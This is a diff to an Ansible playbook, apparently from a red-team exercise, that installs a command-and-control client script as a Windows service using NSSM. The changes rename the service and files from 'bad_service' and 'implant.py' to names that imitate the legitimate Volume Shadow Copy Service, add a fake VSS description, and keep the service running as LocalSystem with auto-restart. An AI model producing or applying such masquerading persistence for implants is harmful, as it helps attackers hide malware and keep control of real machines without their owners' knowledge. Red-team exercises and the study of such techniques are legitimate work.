@@ -2,9 +2,9 @@
 -   name: Deploy script as Service
     hosts: all
     vars:
-      service_name: "bad_service"
-      service_directory: "C://Windows/BadService"
-      service_script: "{{ service_directory }}\\implant.py"
+      service_name: "VssWriterService"
+      service_directory: "C://Windows/Vss/Writers/VssWriter/"
+      service_script: "{{ service_directory }}\\VssWriter.py"
       local_file: "/home/redteam/310Infragroup7nyameow/Matt_tool/c2_programs/Client_C2.py"
       nssm_exe: "{{ service_directory }}\\nssm.exe"
       local_nssm: "/home/redteam/310Infragroup7nyameow/Matt_tool/nssm1.exe"
@@ -42,7 +42,8 @@
           & "{{ nssm_exe }}" set "{{ service_name }}" AppDirectory "{{ service_directory }}"
           & "{{ nssm_exe }}" set "{{ service_name }}" ObjectName "LocalSystem"
           & "{{ nssm_exe }}" set "{{ service_name }}" AppExit Default Restart
-
+          & "{{ nssm_exe }}" set "{{ service_name }}" AppThrottle 5000  # 5-second delay
+          & "{{ nssm_exe }}" set "{{ service_name }}" Description "VssWriter Service - Provides backup and restore capabilities for applications that use the Volume Shadow Copy Service (VSS)."
       - name: Set service to auto start
         ansible.windows.win_service:
           name: "{{ service_name }}"
